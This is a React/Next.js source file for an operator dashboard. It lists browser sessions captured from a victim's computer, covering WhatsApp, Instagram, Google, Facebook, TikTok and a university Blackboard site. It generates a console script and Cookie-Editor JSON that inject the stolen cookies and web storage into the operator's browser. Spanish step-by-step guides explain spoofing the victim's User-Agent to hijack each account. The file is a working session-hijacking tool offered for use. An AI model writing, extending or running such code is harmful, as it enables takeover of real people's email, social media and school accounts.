"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu, Trash2, Key, ArrowLeft, MousePointer2, Zap
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import Link from "next/link";
import { useParams } from "next/navigation";

export const runtime = 'edge';

interface AccountInfo {
  platform: string;
  identifier: string;
  icon: any;
  color: string;
  health: "active" | "expiring" | "expired";
  domain: string;
}

const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], downloadLink?: string, warning?: string }> = {
  "WhatsApp": {
    title: "Deep Restore: WhatsApp Web",
    steps: [
      "PASO 1: Abre web.whatsapp.com.",
      "PASO 2: Presiona F12 -> Console.",
      "PASO 3: Haz clic en 'CONSOLE BOOT' hasta que diga '¡LISTO!'.",
      "PASO 4: Pégalo en la consola de WhatsApp y presiona ENTER.",
      "PASO 5: Si ves el código QR, la sesión del equipo original se cerró."
    ],
    warning: "La sesión de WhatsApp es muy volátil. Úsala rápido."
  },
  "Instagram": {
    title: "Session Injection: Instagram",
    steps: [
      "PASO 1: Instala 'Cookie-Editor'.",
      "PASO 2: LIMPIEZA: Abre instagram.com y BORRA todas las cookies.",
      "PASO 3: USER-AGENT: Copia el 'User-Agent' de este panel y aplícalo.",
      "PASO 4: IMPORTAR: Usa 'EXPORTAR JSON' y pégalo en la extensión.",
      "PASO 5: Refresca instagram.com."
    ]
  },
  "Google": {
    title: "Google Master Access",
    steps: [
      "PASO 1: Es CRÍTICO configurar el User-Agent original.",
      "PASO 2: Entra a google.com e importa las cookies JSON.",
      "PASO 3: Refresca y ve a mail.google.com.",
      "PASO 4: Si pide password, el User-Agent es incorrecto."
    ]
  },
  "Blackboard": {
    title: "Acceso Forzado: Blackboard",
    steps: [
      "PASO 1: Asegúrate de estar en aulavirtual.up.edu.pe.",
      "PASO 2: COPIA EL USER-AGENT del panel gris y ponlo en tu navegador.",
      "PASO 3: Presiona F12 y ve a 'Console'.",
      "PASO 4: Haz clic en 'CONSOLE BOOT', pégalo en la consola y presiona ENTER.",
      "PASO 5: Espera a que recargue solo."
    ],
    warning: "Si te sale 'Cannot set properties of undefined', es porque el USER-AGENT no es el mismo que el del equipo capturado."
  }
};

const isNew = (date: string) => {
  const diff = Date.now() - new Date(date).getTime();
  return diff < 15 * 60 * 1000; // 15 minutos
};

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diff = Math.floor((now.getTime() - captured.getTime()) / 1000);
  if (diff < 60) return `hace ${diff}s`;
  if (diff < 3600) return `hace ${Math.floor(diff / 60)}m`;
  if (diff < 86400) return `hace ${Math.floor(diff / 3600)}h`;
  return captured.toLocaleDateString();
};

export default function DeviceControlCenter() {
  const params = useParams();
  const deviceId = params.id as string;
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [webStorage, setWebStorage] = useState<any[]>([]);
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);
  const [copiedJson, setCopiedJson] = useState(false);
  const [copiedUA, setCopiedUA] = useState(false);

  const loadAll = async () => {
    setLoading(true);
    const { data: sData } = await supabase.from("session_snapshots").select("*").eq("device_id", deviceId).order("captured_at", { ascending: false });
    if (sData) {
      const sIds = sData.map(s => s.id);
      const { data: allC } = await supabase.from("cookies").select("*").in("snapshot_id", sIds);
      const newMap: Record<string, AccountInfo> = {};
      const ALLOWED = ["Instagram", "Facebook", "WhatsApp", "Blackboard", "Google", "TikTok"];
      sData.forEach(s => {
        const cs = (allC || []).filter(c => c.snapshot_id === s.id);
        const dStr = cs.map(c => c.domain.toLowerCase()).join(" ");
        let platform = "External"; let icon = Shield; let color = "text-blue-400"; let domain = "unknown.com";
        if (dStr.includes("whatsapp")) { platform="WhatsApp"; icon=MessageSquare; color="text-green-500"; domain="web.whatsapp.com"; }
        else if (cs.find(c => c.name === "ds_user_id")) { platform="Instagram"; icon=Instagram; color="text-pink-500"; domain="instagram.com"; }
        else if (cs.find(c => c.name === "c_user")) { platform="Facebook"; icon=Facebook; color="text-blue-500"; domain="facebook.com"; }
        else if (dStr.includes("up.edu.pe")) { platform="Blackboard"; icon=GraduationCap; color="text-blue-400"; domain="up.edu.pe"; }
        else if (dStr.includes("tiktok")) { platform="TikTok"; icon=Play; color="text-pink-400"; domain="tiktok.com"; }
        else if (dStr.includes("google")) { platform="Google"; icon=Globe; color="text-red-400"; domain="google.com"; }
        if (ALLOWED.includes(platform)) newMap[s.id] = { platform, icon, color, health: "active", domain, identifier: s.user_id };
      });
      const valid = sData.filter(s => newMap[s.id]);
      setAccountMap(newMap); setSessions(valid);
      if (valid.length > 0) handleSelect(valid[0]);
    }
    setLoading(false);
  };

  useEffect(() => { loadAll(); }, [deviceId]);

  const handleSelect = async (s: SessionSnapshot) => {
    setSelectedSession(s);
    const { data: c } = await supabase.from("cookies").select("*").eq("snapshot_id", s.id);
    const { data: st } = await supabase.from("web_storage").select("*").eq("snapshot_id", s.id);
    setCookies(c || []); setWebStorage(st || []);
  };

  const copyUA = () => { if (selectedSession) navigator.clipboard.writeText(selectedSession.user_agent || "").then(() => { setCopiedUA(true); setTimeout(()=>setCopiedUA(false), 3000); }); };
  
  const copyJson = () => {
    if (!selectedSession) return;
    const t = accountMap[selectedSession.id]?.domain.toLowerCase() || "";
    const f = cookies.filter(c => c.domain.toLowerCase().includes(t)).map(c => {
      const isHostOnly = !c.domain.startsWith(".");
      return {
        domain: isHostOnly ? c.domain.replace(/^\./, "") : (c.domain.startsWith('.') ? c.domain : "." + c.domain),
        expirationDate: Math.floor(Date.now() / 1000) + 86400 * 90,
        hostOnly: isHostOnly,
        httpOnly: c.http_only,
        name: c.name,
        path: c.path || "/",
        sameSite: c.same_site === 'no_restriction' ? 'no_restriction' : 'lax',
        secure: true,
        session: false,
        value: (c.value || "").replace(/^"|"$/g, "").replace(/\\([0-7]{3})/g, (m, o) => String.fromCharCode(parseInt(o, 8)))
      };
    });
    navigator.clipboard.writeText(JSON.stringify(f, null, 2)).then(() => { setCopiedJson(true); setTimeout(() => setCopiedJson(false), 5000); });
  };

  const copyConsole = () => {
    const ls = webStorage.filter(s => s.storage_type === 'localstorage');
    const ss = webStorage.filter(s => s.storage_type === 'sessionstorage');
    const s = `(function(){
      const c=${JSON.stringify(cookies)};
      const ls=${JSON.stringify(ls)};
      const ss=${JSON.stringify(ss)};
      console.log('%c EDU-SYNC BOOT ACTIVATED ', 'background: #222; color: #bada55; font-size: 20px;');
      console.warn('ASEGÚRATE DE ESTAR USANDO EL USER-AGENT CORRECTO.');
      
      // Limpieza profunda
      document.cookie.split(";").forEach(x=>{
        const n=x.split("=")[0].trim();
        document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname;
        document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + location.hostname;
      });
      localStorage.clear(); sessionStorage.clear();

      // Inyectar Cookies
      c.forEach(x=>{
        try {
          let d = x.domain;
          let extra = "; domain=" + d;
          if (x.name.startsWith('__Host-')) extra = ""; 
          document.cookie = x.name + "=" + x.value + extra + "; path=" + (x.path||"/") + "; SameSite=" + (x.same_site === 'no_restriction' ? 'None' : 'Lax') + "; Secure";
        } catch(e){}
      });

      // Inyectar Storage
      ls.forEach(x=>{try{localStorage.setItem(x.key,x.value)}catch(e){}});
      ss.forEach(x=>{try{sessionStorage.setItem(x.key,x.value)}catch(e){}});

      console.log('Restauración completada. Recargando en 2 segundos...');
      setTimeout(()=>location.reload(), 2000);
    })()`;
    navigator.clipboard.writeText(s).then(() => { setCopied(true); setTimeout(() => setCopied(false), 5000); });
  };

  return (
    <div className="min-h-screen bg-[#050505] text-white flex overflow-hidden">
        <aside className="w-[400px] border-r border-white/5 bg-black/40 flex flex-col">
          <div className="p-10 border-b border-white/5 space-y-8">
            <Link href="/" className="px-4 py-2 bg-blue-500/10 text-blue-400 text-[10px] font-black uppercase rounded-lg border border-blue-500/20 inline-flex items-center gap-2 shadow-lg hover:bg-blue-500/20 transition-all"><ArrowLeft size={14}/> Dashboard</Link>
            <div className="flex items-center gap-5">
              <div className="w-14 h-14 bg-blue-500/20 rounded-2xl flex items-center justify-center text-blue-400 border border-blue-500/10"><Monitor size={28}/></div>
              <h2 className="text-xl font-black uppercase tracking-tight truncate">{sessions.length>0?sessions[0].pc_name:"Cargando..."}</h2>
            </div>
          </div>
          <div className="flex-1 overflow-y-auto p-6 space-y-4 custom-scrollbar">
            {loading ? <p className="p-10 text-[10px] uppercase font-black opacity-20">Verificando red...</p> : 
             sessions.map(s => (
               <button key={s.id} onClick={()=>handleSelect(s)} className={`w-full text-left p-6 rounded-[2rem] border transition-all relative ${selectedSession?.id===s.id?'bg-blue-600 border-blue-500 shadow-xl':'bg-white/[0.02] border-white/5 opacity-40 hover:opacity-100'}`}>
                 {isNew(s.captured_at) && (
                    <div className="absolute top-4 right-4 flex items-center gap-1 bg-emerald-500 text-white text-[8px] font-black px-2 py-0.5 rounded-full animate-pulse shadow-lg shadow-emerald-500/20">
                       <Zap size={10} fill="currentColor"/> NUEVO
                    </div>
                 )}
                 <div className="flex items-center gap-4">
                   <div className="p-3 bg-black/30 rounded-xl">{React.createElement(accountMap[s.id]?.icon || Shield, { size: 20, className: selectedSession?.id===s.id? 'text-white' : accountMap[s.id]?.color })}</div>
                   <div>
                      <p className="font-black text-xs uppercase tracking-wider">{accountMap[s.id]?.platform}</p>
                      <p className="text-[9px] text-gray-400 font-bold uppercase flex items-center gap-2">
                        <Clock size={10}/> {formatRelativeTime(s.captured_at)}
                      </p>
                   </div>
                 </div>
               </button>
             ))}
          </div>
        </aside>

        <main className="flex-1 overflow-y-auto p-12 custom-scrollbar bg-[#050505] relative">
          {/* Alerta de User-Agent Crítica */}
          {selectedSession && (
            <div className="mb-10 p-6 bg-yellow-500/10 border border-yellow-500/20 rounded-3xl flex items-center justify-between">
               <div className="flex items-center gap-6">
                  <div className="w-12 h-12 rounded-2xl bg-yellow-500/20 flex items-center justify-center text-yellow-500"><Shield size={24}/></div>
                  <div>
                    <h4 className="text-sm font-black uppercase tracking-widest text-yellow-500">Requisito de Seguridad: User-Agent</h4>
                    <p className="text-[10px] text-gray-400 font-bold uppercase truncate max-w-[500px]">{selectedSession.user_agent}</p>
                  </div>
               </div>
               <button onClick={copyUA} className="px-6 py-3 bg-yellow-500 text-black text-[10px] font-black uppercase rounded-xl hover:bg-yellow-400 transition-all active:scale-95 shadow-xl shadow-yellow-500/20">
                  {copiedUA ? '¡COPIADO!' : 'COPIAR IDENTIFICADOR'}
               </button>
            </div>
          )}

          <AnimatePresence mode="wait">
            {selectedSession && (
              <motion.div key={selectedSession.id} initial={{opacity:0,y:20}} animate={{opacity:1,y:0}} className="space-y-12">
                <div className="flex items-center justify-between border-b border-white/5 pb-10">
                   <div className="flex items-center gap-8">
                      <div className={`w-24 h-24 rounded-[3rem] bg-black/60 border border-white/10 flex items-center justify-center ${accountMap[selectedSession.id]?.color}`}>{React.createElement(accountMap[selectedSession.id]?.icon || Shield, { size: 48 })}</div>
                      <div>
                        <div className="flex items-center gap-4">
                          <h1 className="text-5xl font-black uppercase tracking-tighter">{accountMap[selectedSession.id]?.platform}</h1>
                          {isNew(selectedSession.captured_at) && <span className="px-4 py-1 bg-emerald-500 text-white text-[10px] font-black rounded-full animate-pulse">RECIENTE</span>}
                        </div>
                        <p className="text-blue-400 font-black text-sm uppercase tracking-widest">{accountMap[selectedSession.id]?.domain}</p>
                      </div>
                   </div>
                   <div className="flex gap-4">
                      <div className="p-6 bg-white/[0.02] rounded-3xl border border-white/5 text-center min-w-[120px]"><p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-1">COOKIES</p><p className="text-3xl font-black">{cookies.length}</p></div>
                      <div className="p-6 bg-white/[0.02] rounded-3xl border border-white/5 text-center min-w-[120px]"><p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-1">STORAGE</p><p className="text-3xl font-black">{webStorage.length}</p></div>
                   </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
                   <div className="space-y-8">
                      <div className="glass-intense p-10 rounded-[3rem] border border-white/10 bg-white/[0.02] space-y-6">
                         <h3 className="text-xl font-black uppercase tracking-widest text-blue-400 flex items-center gap-3"><List size={20}/> Pasos Críticos</h3>
                         {RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform] && (
                           <div className="space-y-6">
                              {RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform].steps.map((st, i)=>(<div key={i} className="flex gap-4 items-start"><div className="w-6 h-6 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center text-[10px] font-black shrink-0">{i+1}</div><p className="text-xs font-bold text-gray-300">{st}</p></div>))}
                              {RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform].warning && <div className="p-5 bg-red-500/10 rounded-2xl flex gap-3 text-red-500 text-[10px] font-black uppercase border border-red-500/20"><AlertCircle size={18}/><p>{RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform].warning}</p></div>}
                           </div>
                         )}
                      </div>
                      <button onClick={copyJson} className="w-full p-8 rounded-[2rem] bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center gap-4 transition-all active:scale-95 hover:bg-indigo-500/20">
                        <FileJson size={24} className="text-indigo-400"/>
                        <span className="text-sm font-black uppercase tracking-widest text-indigo-400">{copiedJson ? '¡JSON COPIADO CON ÉXITO!' : 'EXPORTAR SESIÓN PARA EXTENSIÓN'}</span>
                      </button>
                   </div>

                   <div className="space-y-8">
                      <button onClick={copyConsole} className={`w-full py-20 rounded-[4rem] text-3xl font-black shadow-2xl transition-all active:scale-95 flex flex-col items-center justify-center gap-4 ${copied ? 'bg-emerald-600 shadow-emerald-500/20' : 'bg-blue-600 hover:bg-blue-500 shadow-blue-500/30'}`}>
                         <div className="flex items-center gap-4"><Zap size={32} fill="currentColor"/> {copied ? '¡RESTAURACIÓN LISTA!' : 'CONSOLE BOOT'}</div>
                         <span className="text-sm uppercase font-black tracking-[0.2em] opacity-50">{copied ? 'Pulsa CTRL + V en la ventana de Blackboard' : 'INYECTAR BYPASS DE SEGURIDAD'}</span>
                      </button>
                      <div className="p-8 rounded-[3rem] border border-white/5 bg-black/40 h-[320px] flex flex-col relative overflow-hidden">
                        <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 to-emerald-500"></div>
                        <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-4 flex items-center gap-2"><Clock size={12}/> Historial de captura de datos</p>
                        <div className="flex-1 overflow-y-auto space-y-2 custom-scrollbar pr-4">
                           {cookies.slice(0, 50).map((c,i)=>(<div key={i} className="p-3 bg-white/[0.02] rounded-xl border border-white/5 flex justify-between items-center text-[9px] font-mono text-white/30 truncate"><span>{c.domain}</span><span className="font-bold text-white/50">{c.name}</span></div>))}
                        </div>
                      </div>
                   </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </main>
    </div>
  );
}
